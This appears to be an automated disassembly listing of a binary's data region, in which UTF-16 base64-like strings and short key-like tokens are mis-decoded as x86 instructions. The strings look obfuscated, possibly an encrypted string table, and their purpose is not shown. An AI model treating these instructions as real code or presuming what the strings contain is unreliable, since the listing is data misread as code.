100046a5:	00 57 00             	add    %dl,0x0(%edi)
100046a8:	48                   	dec    %eax
100046a9:	00 56 00             	add    %dl,0x0(%esi)
100046ac:	6a 00                	push   $0x0
100046ae:	5a                   	pop    %edx
100046af:	00 32                	add    %dh,(%edx)
100046b1:	00 5a 00             	add    %bl,0x0(%edx)
100046b4:	6a 00                	push   $0x0
100046b6:	4d                   	dec    %ebp
100046b7:	00 6a 00             	add    %ch,0x0(%edx)
100046ba:	6b 00 7a             	imul   $0x7a,(%eax),%eax
100046bd:	00 65 00             	add    %ah,0x0(%ebp)
100046c0:	54                   	push   %esp
100046c1:	00 4a 00             	add    %cl,0x0(%edx)
100046c4:	51                   	push   %ecx
100046c5:	00 53 00             	add    %dl,0x0(%ebx)
100046c8:	31 00                	xor    %eax,(%eax)
100046ca:	68 00 31 00 59       	push   $0x59003100
100046cf:	00 32                	add    %dh,(%edx)
100046d1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100046d5:	00 4d 00             	add    %cl,0x0(%ebp)
100046d8:	33 00                	xor    (%eax),%eax
100046da:	6b 00 79             	imul   $0x79,(%eax),%eax
100046dd:	00 55 00             	add    %dl,0x0(%ebp)
100046e0:	45                   	inc    %ebp
100046e1:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
100046e5:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100046e9:	00 4e 00             	add    %cl,0x0(%esi)
100046ec:	6e                   	outsb  %ds:(%esi),(%dx)
100046ed:	00 5a 00             	add    %bl,0x0(%edx)
100046f0:	6d                   	insl   (%dx),%es:(%edi)
100046f1:	00 31                	add    %dh,(%ecx)
100046f3:	00 6b 00             	add    %ch,0x0(%ebx)
100046f6:	51                   	push   %ecx
100046f7:	00 7a 00             	add    %bh,0x0(%edx)
100046fa:	4e                   	dec    %esi
100046fb:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004701:	00 42 00             	add    %al,0x0(%edx)
10004704:	4c                   	dec    %esp
10004705:	00 57 00             	add    %dl,0x0(%edi)
10004708:	48                   	dec    %eax
10004709:	00 56 00             	add    %dl,0x0(%esi)
1000470c:	6a 00                	push   $0x0
1000470e:	5a                   	pop    %edx
1000470f:	00 32                	add    %dh,(%edx)
10004711:	00 59 00             	add    %bl,0x0(%ecx)
10004714:	7a 00                	jp     0x10004716
10004716:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
1000471b:	00 51 00             	add    %dl,0x0(%ecx)
1000471e:	53                   	push   %ebx
1000471f:	00 31                	add    %dh,(%ecx)
10004721:	00 68 00             	add    %ch,0x0(%eax)
10004724:	31 00                	xor    %eax,(%eax)
10004726:	59                   	pop    %ecx
10004727:	00 32                	add    %dh,(%edx)
10004729:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000472d:	00 4e 00             	add    %cl,0x0(%esi)
10004730:	55                   	push   %ebp
10004731:	00 39                	add    %bh,(%ecx)
10004733:	00 53 00             	add    %dl,0x0(%ebx)
10004736:	4d                   	dec    %ebp
10004737:	00 33                	add    %dh,(%ebx)
10004739:	00 6b 00             	add    %ch,0x0(%ebx)
1000473c:	79 00                	jns    0x1000473e
1000473e:	55                   	push   %ebp
1000473f:	00 45 00             	add    %al,0x0(%ebp)
10004742:	74 00                	je     0x10004744
10004744:	59                   	pop    %ecx
10004745:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004749:	00 4e 00             	add    %cl,0x0(%esi)
1000474c:	6e                   	outsb  %ds:(%esi),(%dx)
1000474d:	00 5a 00             	add    %bl,0x0(%edx)
10004750:	6a 00                	push   $0x0
10004752:	4e                   	dec    %esi
10004753:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004759:	00 42 00             	add    %al,0x0(%edx)
1000475c:	4c                   	dec    %esp
1000475d:	00 57 00             	add    %dl,0x0(%edi)
10004760:	48                   	dec    %eax
10004761:	00 56 00             	add    %dl,0x0(%esi)
10004764:	6a 00                	push   $0x0
10004766:	5a                   	pop    %edx
10004767:	00 32                	add    %dh,(%edx)
10004769:	00 5a 00             	add    %bl,0x0(%edx)
1000476c:	57                   	push   %edi
1000476d:	00 55 00             	add    %dl,0x0(%ebp)
10004770:	6d                   	insl   (%dx),%es:(%edi)
10004771:	00 4d 00             	add    %cl,0x0(%ebp)
10004774:	7a 00                	jp     0x10004776
10004776:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
1000477b:	00 51 00             	add    %dl,0x0(%ecx)
1000477e:	53                   	push   %ebx
1000477f:	00 31                	add    %dh,(%ecx)
10004781:	00 68 00             	add    %ch,0x0(%eax)
10004784:	31 00                	xor    %eax,(%eax)
10004786:	59                   	pop    %ecx
10004787:	00 32                	add    %dh,(%edx)
10004789:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000478d:	00 4d 00             	add    %cl,0x0(%ebp)
10004790:	33 00                	xor    (%eax),%eax
10004792:	6b 00 79             	imul   $0x79,(%eax),%eax
10004795:	00 55 00             	add    %dl,0x0(%ebp)
10004798:	45                   	inc    %ebp
10004799:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
1000479d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100047a1:	00 4e 00             	add    %cl,0x0(%esi)
100047a4:	6e                   	outsb  %ds:(%esi),(%dx)
100047a5:	00 5a 00             	add    %bl,0x0(%edx)
100047a8:	6c                   	insb   (%dx),%es:(%edi)
100047a9:	00 68 00             	add    %ch,0x0(%eax)
100047ac:	46                   	inc    %esi
100047ad:	00 57 00             	add    %dl,0x0(%edi)
100047b0:	6a 00                	push   $0x0
100047b2:	4e                   	dec    %esi
100047b3:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
100047b9:	00 42 00             	add    %al,0x0(%edx)
100047bc:	4c                   	dec    %esp
100047bd:	00 57 00             	add    %dl,0x0(%edi)
100047c0:	48                   	dec    %eax
100047c1:	00 56 00             	add    %dl,0x0(%esi)
100047c4:	6a 00                	push   $0x0
100047c6:	5a                   	pop    %edx
100047c7:	00 32                	add    %dh,(%edx)
100047c9:	00 59 00             	add    %bl,0x0(%ecx)
100047cc:	7a 00                	jp     0x100047ce
100047ce:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100047d3:	00 51 00             	add    %dl,0x0(%ecx)
100047d6:	53                   	push   %ebx
100047d7:	00 31                	add    %dh,(%ecx)
100047d9:	00 68 00             	add    %ch,0x0(%eax)
100047dc:	31 00                	xor    %eax,(%eax)
100047de:	59                   	pop    %ecx
100047df:	00 32                	add    %dh,(%edx)
100047e1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100047e5:	00 65 00             	add    %ah,0x0(%ebp)
100047e8:	56                   	push   %esi
100047e9:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
100047ed:	00 4d 00             	add    %cl,0x0(%ebp)
100047f0:	33 00                	xor    (%eax),%eax
100047f2:	6b 00 79             	imul   $0x79,(%eax),%eax
100047f5:	00 55 00             	add    %dl,0x0(%ebp)
100047f8:	45                   	inc    %ebp
100047f9:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
100047fd:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004801:	00 4e 00             	add    %cl,0x0(%esi)
10004804:	6e                   	outsb  %ds:(%esi),(%dx)
10004805:	00 5a 00             	add    %bl,0x0(%edx)
10004808:	6a 00                	push   $0x0
1000480a:	4e                   	dec    %esi
1000480b:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004811:	00 42 00             	add    %al,0x0(%edx)
10004814:	4c                   	dec    %esp
10004815:	00 57 00             	add    %dl,0x0(%edi)
10004818:	48                   	dec    %eax
10004819:	00 56 00             	add    %dl,0x0(%esi)
1000481c:	6a 00                	push   $0x0
1000481e:	5a                   	pop    %edx
1000481f:	00 32                	add    %dh,(%edx)
10004821:	00 59 00             	add    %bl,0x0(%ecx)
10004824:	78 00                	js     0x10004826
10004826:	62 00                	bound  %eax,(%eax)
10004828:	47                   	inc    %edi
10004829:	00 51 00             	add    %dl,0x0(%ecx)
1000482c:	7a 00                	jp     0x1000482e
1000482e:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
10004833:	00 51 00             	add    %dl,0x0(%ecx)
10004836:	53                   	push   %ebx
10004837:	00 31                	add    %dh,(%ecx)
10004839:	00 68 00             	add    %ch,0x0(%eax)
1000483c:	31 00                	xor    %eax,(%eax)
1000483e:	59                   	pop    %ecx
1000483f:	00 32                	add    %dh,(%edx)
10004841:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004845:	00 4d 00             	add    %cl,0x0(%ebp)
10004848:	33 00                	xor    (%eax),%eax
1000484a:	6b 00 79             	imul   $0x79,(%eax),%eax
1000484d:	00 55 00             	add    %dl,0x0(%ebp)
10004850:	45                   	inc    %ebp
10004851:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
10004855:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004859:	00 4e 00             	add    %cl,0x0(%esi)
1000485c:	6e                   	outsb  %ds:(%esi),(%dx)
1000485d:	00 5a 00             	add    %bl,0x0(%edx)
10004860:	6a 00                	push   $0x0
10004862:	49                   	dec    %ecx
10004863:	00 35 00 65 00 54    	add    %dh,0x54006500
10004869:	00 4e 00             	add    %cl,0x0(%esi)
1000486c:	35 00 4d 00 6c       	xor    $0x6c004d00,%eax
10004871:	00 42 00             	add    %al,0x0(%edx)
10004874:	4c                   	dec    %esp
10004875:	00 57 00             	add    %dl,0x0(%edi)
10004878:	48                   	dec    %eax
10004879:	00 56 00             	add    %dl,0x0(%esi)
1000487c:	6a 00                	push   $0x0
1000487e:	5a                   	pop    %edx
1000487f:	00 32                	add    %dh,(%edx)
10004881:	00 59 00             	add    %bl,0x0(%ecx)
10004884:	7a 00                	jp     0x10004886
10004886:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
1000488b:	00 51 00             	add    %dl,0x0(%ecx)
1000488e:	53                   	push   %ebx
1000488f:	00 31                	add    %dh,(%ecx)
10004891:	00 68 00             	add    %ch,0x0(%eax)
10004894:	31 00                	xor    %eax,(%eax)
10004896:	59                   	pop    %ecx
10004897:	00 32                	add    %dh,(%edx)
10004899:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000489d:	00 59 00             	add    %bl,0x0(%ecx)
100048a0:	54                   	push   %esp
100048a1:	00 46 00             	add    %al,0x0(%esi)
100048a4:	34 00                	xor    $0x0,%al
100048a6:	4d                   	dec    %ebp
100048a7:	00 33                	add    %dh,(%ebx)
100048a9:	00 6b 00             	add    %ch,0x0(%ebx)
100048ac:	79 00                	jns    0x100048ae
100048ae:	55                   	push   %ebp
100048af:	00 45 00             	add    %al,0x0(%ebp)
100048b2:	74 00                	je     0x100048b4
100048b4:	59                   	pop    %ecx
100048b5:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100048b9:	00 4e 00             	add    %cl,0x0(%esi)
100048bc:	6e                   	outsb  %ds:(%esi),(%dx)
100048bd:	00 5a 00             	add    %bl,0x0(%edx)
100048c0:	6a 00                	push   $0x0
100048c2:	4e                   	dec    %esi
100048c3:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
100048c9:	00 42 00             	add    %al,0x0(%edx)
100048cc:	4c                   	dec    %esp
100048cd:	00 57 00             	add    %dl,0x0(%edi)
100048d0:	48                   	dec    %eax
100048d1:	00 56 00             	add    %dl,0x0(%esi)
100048d4:	6a 00                	push   $0x0
100048d6:	5a                   	pop    %edx
100048d7:	00 32                	add    %dh,(%edx)
100048d9:	00 5a 00             	add    %bl,0x0(%edx)
100048dc:	6a 00                	push   $0x0
100048de:	5a                   	pop    %edx
100048df:	00 47 00             	add    %al,0x0(%edi)
100048e2:	6f                   	outsl  %ds:(%esi),(%dx)
100048e3:	00 7a 00             	add    %bh,0x0(%edx)
100048e6:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100048eb:	00 51 00             	add    %dl,0x0(%ecx)
100048ee:	53                   	push   %ebx
100048ef:	00 31                	add    %dh,(%ecx)
100048f1:	00 68 00             	add    %ch,0x0(%eax)
100048f4:	31 00                	xor    %eax,(%eax)
100048f6:	59                   	pop    %ecx
100048f7:	00 32                	add    %dh,(%edx)
100048f9:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100048fd:	00 4d 00             	add    %cl,0x0(%ebp)
10004900:	33 00                	xor    (%eax),%eax
10004902:	6b 00 79             	imul   $0x79,(%eax),%eax
10004905:	00 55 00             	add    %dl,0x0(%ebp)
10004908:	45                   	inc    %ebp
10004909:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
1000490d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004911:	00 4e 00             	add    %cl,0x0(%esi)
10004914:	6e                   	outsb  %ds:(%esi),(%dx)
10004915:	00 5a 00             	add    %bl,0x0(%edx)
10004918:	6c                   	insb   (%dx),%es:(%edi)
10004919:	00 46 00             	add    %al,0x0(%esi)
1000491c:	31 00                	xor    %eax,(%eax)
1000491e:	54                   	push   %esp
1000491f:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004923:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004929:	00 42 00             	add    %al,0x0(%edx)
1000492c:	4c                   	dec    %esp
1000492d:	00 57 00             	add    %dl,0x0(%edi)
10004930:	48                   	dec    %eax
10004931:	00 56 00             	add    %dl,0x0(%esi)
10004934:	6a 00                	push   $0x0
10004936:	5a                   	pop    %edx
10004937:	00 32                	add    %dh,(%edx)
10004939:	00 59 00             	add    %bl,0x0(%ecx)
1000493c:	7a 00                	jp     0x1000493e
1000493e:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
10004943:	00 51 00             	add    %dl,0x0(%ecx)
10004946:	53                   	push   %ebx
10004947:	00 31                	add    %dh,(%ecx)
10004949:	00 68 00             	add    %ch,0x0(%eax)
1000494c:	31 00                	xor    %eax,(%eax)
1000494e:	59                   	pop    %ecx
1000494f:	00 32                	add    %dh,(%edx)
10004951:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004955:	00 51 00             	add    %dl,0x0(%ecx)
10004958:	7a 00                	jp     0x1000495a
1000495a:	52                   	push   %edx
1000495b:	00 36                	add    %dh,(%esi)
1000495d:	00 4d 00             	add    %cl,0x0(%ebp)
10004960:	33 00                	xor    (%eax),%eax
10004962:	6b 00 79             	imul   $0x79,(%eax),%eax
10004965:	00 55 00             	add    %dl,0x0(%ebp)
10004968:	45                   	inc    %ebp
10004969:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
1000496d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004971:	00 4e 00             	add    %cl,0x0(%esi)
10004974:	6e                   	outsb  %ds:(%esi),(%dx)
10004975:	00 5a 00             	add    %bl,0x0(%edx)
10004978:	6a 00                	push   $0x0
1000497a:	4e                   	dec    %esi
1000497b:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004981:	00 42 00             	add    %al,0x0(%edx)
10004984:	4c                   	dec    %esp
10004985:	00 57 00             	add    %dl,0x0(%edi)
10004988:	48                   	dec    %eax
10004989:	00 56 00             	add    %dl,0x0(%esi)
1000498c:	6a 00                	push   $0x0
1000498e:	5a                   	pop    %edx
1000498f:	00 32                	add    %dh,(%edx)
10004991:	00 5a 00             	add    %bl,0x0(%edx)
10004994:	4e                   	dec    %esi
10004995:	00 52 00             	add    %dl,0x0(%edx)
10004998:	45                   	inc    %ebp
10004999:	00 30                	add    %dh,(%eax)
1000499b:	00 7a 00             	add    %bh,0x0(%edx)
1000499e:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100049a3:	00 51 00             	add    %dl,0x0(%ecx)
100049a6:	53                   	push   %ebx
100049a7:	00 31                	add    %dh,(%ecx)
100049a9:	00 68 00             	add    %ch,0x0(%eax)
100049ac:	31 00                	xor    %eax,(%eax)
100049ae:	59                   	pop    %ecx
100049af:	00 32                	add    %dh,(%edx)
100049b1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100049b5:	00 4d 00             	add    %cl,0x0(%ebp)
100049b8:	33 00                	xor    (%eax),%eax
100049ba:	6b 00 79             	imul   $0x79,(%eax),%eax
100049bd:	00 55 00             	add    %dl,0x0(%ebp)
100049c0:	45                   	inc    %ebp
100049c1:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
100049c5:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100049c9:	00 4e 00             	add    %cl,0x0(%esi)
100049cc:	6e                   	outsb  %ds:(%esi),(%dx)
100049cd:	00 5a 00             	add    %bl,0x0(%edx)
100049d0:	6e                   	outsb  %ds:(%esi),(%dx)
100049d1:	00 68 00             	add    %ch,0x0(%eax)
100049d4:	50                   	push   %eax
100049d5:	00 56 00             	add    %dl,0x0(%esi)
100049d8:	6a 00                	push   $0x0
100049da:	4e                   	dec    %esi
100049db:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
100049e1:	00 42 00             	add    %al,0x0(%edx)
100049e4:	4c                   	dec    %esp
100049e5:	00 57 00             	add    %dl,0x0(%edi)
100049e8:	48                   	dec    %eax
100049e9:	00 56 00             	add    %dl,0x0(%esi)
100049ec:	6a 00                	push   $0x0
100049ee:	5a                   	pop    %edx
100049ef:	00 32                	add    %dh,(%edx)
100049f1:	00 59 00             	add    %bl,0x0(%ecx)
100049f4:	7a 00                	jp     0x100049f6
100049f6:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100049fb:	00 51 00             	add    %dl,0x0(%ecx)
100049fe:	53                   	push   %ebx
100049ff:	00 31                	add    %dh,(%ecx)
10004a01:	00 68 00             	add    %ch,0x0(%eax)
10004a04:	31 00                	xor    %eax,(%eax)
10004a06:	59                   	pop    %ecx
10004a07:	00 32                	add    %dh,(%edx)
10004a09:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004a0d:	00 65 00             	add    %ah,0x0(%ebp)
10004a10:	47                   	inc    %edi
10004a11:	00 4d 00             	add    %cl,0x0(%ebp)
10004a14:	7a 00                	jp     0x10004a16
10004a16:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
10004a1b:	00 51 00             	add    %dl,0x0(%ecx)
10004a1e:	53                   	push   %ebx
10004a1f:	00 31                	add    %dh,(%ecx)
10004a21:	00 68 00             	add    %ch,0x0(%eax)
10004a24:	31 00                	xor    %eax,(%eax)
10004a26:	59                   	pop    %ecx
10004a27:	00 32                	add    %dh,(%edx)
10004a29:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004a2d:	00 00                	add    %al,(%eax)
10004a2f:	15 33 00 79 00       	adc    $0x790033,%eax
10004a34:	32 00                	xor    (%eax),%al
10004a36:	50                   	push   %eax
10004a37:	00 4b 00             	add    %cl,0x0(%ebx)
10004a3a:	58                   	pop    %eax
10004a3b:	00 75 00             	add    %dh,0x0(%ebp)
10004a3e:	63 00                	arpl   %eax,(%eax)
10004a40:	67 00 66 00          	add    %ah,0x0(%bp)
10004a44:	00 80 b9 61 00 57    	add    %al,0x570061b9(%eax)
10004a4a:	00 52 00             	add    %dl,0x0(%edx)
10004a4d:	5a                   	pop    %edx
10004a4e:	00 4d 00             	add    %cl,0x0(%ebp)
10004a51:	6b 00 74             	imul   $0x74,(%eax),%eax
10004a54:	00 32                	add    %dh,(%edx)
10004a56:	00 61 00             	add    %ah,0x0(%ecx)
10004a59:	6a 00                	push   $0x0
10004a5b:	5a                   	pop    %edx
10004a5c:	00 31                	add    %dh,(%ecx)
10004a5e:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10004a62:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
10004a66:	00 4e 00             	add    %cl,0x0(%esi)
10004a69:	57                   	push   %edi
10004a6a:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10004a6e:	00 57 00             	add    %dl,0x0(%edi)
10004a71:	54                   	push   %esp
10004a72:	00 4a 00             	add    %cl,0x0(%edx)
10004a75:	4c                   	dec    %esp
10004a76:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004a7a:	00 6f 00             	add    %ch,0x0(%edi)
10004a7d:	32 00                	xor    (%eax),%al
10004a7f:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10004a83:	5a                   	pop    %edx
10004a84:	00 70 00             	add    %dh,0x0(%eax)
10004a87:	5a                   	pop    %edx
10004a88:	00 46 00             	add    %al,0x0(%esi)
10004a8b:	6b 00 79             	imul   $0x79,(%eax),%eax
10004a8e:	00 53 00             	add    %dl,0x0(%ebx)
10004a91:	33 00                	xor    (%eax),%eax
10004a93:	5a                   	pop    %edx
10004a94:	00 71 00             	add    %dh,0x0(%ecx)
10004a97:	4e                   	dec    %esi
10004a98:	00 6e 00             	add    %ch,0x0(%esi)
10004a9b:	56                   	push   %esi
10004a9c:	00 32                	add    %dh,(%edx)
10004a9e:	00 62 00             	add    %ah,0x0(%edx)
10004aa1:	47                   	inc    %edi
10004aa2:	00 56 00             	add    %dl,0x0(%esi)
10004aa5:	48                   	dec    %eax
10004aa6:	00 61 00             	add    %ah,0x0(%ecx)
10004aa9:	57                   	push   %edi
10004aaa:	00 52 00             	add    %dl,0x0(%edx)
10004aad:	5a                   	pop    %edx
10004aae:	00 4d 00             	add    %cl,0x0(%ebp)
10004ab1:	6b 00 74             	imul   $0x74,(%eax),%eax
10004ab4:	00 32                	add    %dh,(%edx)
10004ab6:	00 61 00             	add    %ah,0x0(%ecx)
10004ab9:	6a 00                	push   $0x0
10004abb:	5a                   	pop    %edx
10004abc:	00 31                	add    %dh,(%ecx)
10004abe:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004ac2:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10004ac6:	00 57 00             	add    %dl,0x0(%edi)
10004ac9:	54                   	push   %esp
10004aca:	00 4a 00             	add    %cl,0x0(%edx)
10004acd:	4c                   	dec    %esp
10004ace:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004ad2:	00 6f 00             	add    %ch,0x0(%edi)
10004ad5:	32 00                	xor    (%eax),%al
10004ad7:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10004adb:	5a                   	pop    %edx
10004adc:	00 56 00             	add    %dl,0x0(%esi)
10004adf:	50                   	push   %eax
10004ae0:	00 57 00             	add    %dl,0x0(%edi)
10004ae3:	6c                   	insb   (%dx),%es:(%edi)
10004ae4:	00 6b 00             	add    %ch,0x0(%ebx)
10004ae7:	57                   	push   %edi
10004ae8:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10004aec:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
10004af0:	00 6d 00             	add    %ch,0x0(%ebp)
10004af3:	6f                   	outsl  %ds:(%esi),(%dx)
10004af4:	00 32                	add    %dh,(%edx)
10004af6:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004afa:	00 59 00             	add    %bl,0x0(%ecx)
10004afd:	3d 00 00 15 69       	cmp    $0x69150000,%eax
10004b02:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
10004b06:	00 32                	add    %dh,(%edx)
10004b08:	00 4b 00             	add    %cl,0x0(%ebx)
10004b0b:	76 00                	jbe    0x10004b0d
10004b0d:	6a 00                	push   $0x0
10004b0f:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
10004b13:	76 00                	jbe    0x10004b15
10004b15:	00 81 f1 61 00 48    	add    %al,0x480061f1(%ecx)
10004b1b:	00 4e 00             	add    %cl,0x0(%esi)
10004b1e:	33 00                	xor    (%eax),%eax
10004b20:	52                   	push   %edx
10004b21:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004b25:	00 50 00             	add    %dl,0x0(%eax)
10004b28:	54                   	push   %esp
10004b29:	00 33                	add    %dh,(%ebx)
10004b2b:	00 56 00             	add    %dl,0x0(%esi)
10004b2e:	46                   	inc    %esi
10004b2f:	00 51 00             	add    %dl,0x0(%ecx)
10004b32:	6c                   	insb   (%dx),%es:(%edi)
10004b33:	00 46 00             	add    %al,0x0(%esi)
10004b36:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
10004b3a:	47                   	inc    %edi
10004b3b:	00 68 00             	add    %ch,0x0(%eax)
10004b3e:	7a 00                	jp     0x10004b40
10004b40:	64 00 30             	add    %dh,%fs:(%eax)
10004b43:	00 55 00             	add    %dl,0x0(%ebp)
10004b46:	78 00                	js     0x10004b48
10004b48:	54                   	push   %esp
10004b49:	00 30                	add    %dh,(%eax)
10004b4b:	00 39                	add    %bh,(%ecx)
10004b4d:	00 31                	add    %dh,(%ecx)
10004b4f:	00 52 00             	add    %dl,0x0(%edx)
10004b52:	55                   	push   %ebp
10004b53:	00 4a 00             	add    %cl,0x0(%edx)
10004b56:	6f                   	outsl  %ds:(%esi),(%dx)
10004b57:	00 63 00             	add    %ah,0x0(%ebx)
10004b5a:	33 00                	xor    (%eax),%eax
10004b5c:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004b60:	4d                   	dec    %ebp
10004b61:	00 55 00             	add    %dl,0x0(%ebp)
10004b64:	39 00                	cmp    %eax,(%eax)
10004b66:	50                   	push   %eax
10004b67:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004b6b:	00 56 00             	add    %dl,0x0(%esi)
10004b6e:	43                   	inc    %ebx
10004b6f:	00 59 00             	add    %bl,0x0(%ecx)
10004b72:	31 00                	xor    %eax,(%eax)
10004b74:	68 00 47 00 61       	push   $0x61004700
10004b79:	00 48 00             	add    %cl,0x0(%eax)
10004b7c:	4e                   	dec    %esi
10004b7d:	00 33                	add    %dh,(%ebx)
10004b7f:	00 52 00             	add    %dl,0x0(%edx)
10004b82:	54                   	push   %esp
10004b83:	00 46 00             	add    %al,0x0(%esi)
10004b86:	50                   	push   %eax
10004b87:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
10004b8b:	00 56 00             	add    %dl,0x0(%esi)
10004b8e:	46                   	inc    %esi
10004b8f:	00 51 00             	add    %dl,0x0(%ecx)
10004b92:	6d                   	insl   (%dx),%es:(%edi)
10004b93:	00 68 00             	add    %ch,0x0(%eax)
10004b96:	7a 00                	jp     0x10004b98
10004b98:	64 00 30             	add    %dh,%fs:(%eax)
10004b9b:	00 55 00             	add    %dl,0x0(%ebp)
10004b9e:	78 00                	js     0x10004ba0
10004ba0:	54                   	push   %esp
10004ba1:	00 30                	add    %dh,(%eax)
10004ba3:	00 39                	add    %bh,(%ecx)
10004ba5:	00 31                	add    %dh,(%ecx)
10004ba7:	00 52 00             	add    %dl,0x0(%edx)
10004baa:	55                   	push   %ebp
10004bab:	00 4a 00             	add    %cl,0x0(%edx)
10004bae:	43                   	inc    %ebx
10004baf:	00 65 00             	add    %ah,0x0(%ebp)
10004bb2:	57                   	push   %edi
10004bb3:	00 4a 00             	add    %cl,0x0(%edx)
10004bb6:	6f                   	outsl  %ds:(%esi),(%dx)
10004bb7:	00 63 00             	add    %ah,0x0(%ebx)
10004bba:	33 00                	xor    (%eax),%eax
10004bbc:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004bc0:	4d                   	dec    %ebp
10004bc1:	00 55 00             	add    %dl,0x0(%ebp)
10004bc4:	39 00                	cmp    %eax,(%eax)
10004bc6:	50                   	push   %eax
10004bc7:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004bcb:	00 56 00             	add    %dl,0x0(%esi)
10004bce:	43                   	inc    %ebx
10004bcf:	00 61 00             	add    %ah,0x0(%ecx)
10004bd2:	48                   	dec    %eax
10004bd3:	00 4e 00             	add    %cl,0x0(%esi)
10004bd6:	33 00                	xor    (%eax),%eax
10004bd8:	52                   	push   %edx
10004bd9:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004bdd:	00 50 00             	add    %dl,0x0(%eax)
10004be0:	54                   	push   %esp
10004be1:	00 33                	add    %dh,(%ebx)
10004be3:	00 56 00             	add    %dl,0x0(%esi)
10004be6:	46                   	inc    %esi
10004be7:	00 51 00             	add    %dl,0x0(%ecx)
10004bea:	6a 00                	push   $0x0
10004bec:	4a                   	dec    %edx
10004bed:	00 6b 00             	add    %ch,0x0(%ebx)
10004bf0:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004bf4:	68 00 7a 00 64       	push   $0x64007a00
10004bf9:	00 30                	add    %dh,(%eax)
10004bfb:	00 55 00             	add    %dl,0x0(%ebp)
10004bfe:	78 00                	js     0x10004c00
10004c00:	54                   	push   %esp
10004c01:	00 30                	add    %dh,(%eax)
10004c03:	00 39                	add    %bh,(%ecx)
10004c05:	00 31                	add    %dh,(%ecx)
10004c07:	00 52 00             	add    %dl,0x0(%edx)
10004c0a:	55                   	push   %ebp
10004c0b:	00 4a 00             	add    %cl,0x0(%edx)
10004c0e:	6f                   	outsl  %ds:(%esi),(%dx)
10004c0f:	00 63 00             	add    %ah,0x0(%ebx)
10004c12:	33 00                	xor    (%eax),%eax
10004c14:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004c18:	4d                   	dec    %ebp
10004c19:	00 55 00             	add    %dl,0x0(%ebp)
10004c1c:	39 00                	cmp    %eax,(%eax)
10004c1e:	50                   	push   %eax
10004c1f:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004c23:	00 56 00             	add    %dl,0x0(%esi)
10004c26:	43                   	inc    %ebx
10004c27:	00 57 00             	add    %dl,0x0(%edi)
10004c2a:	56                   	push   %esi
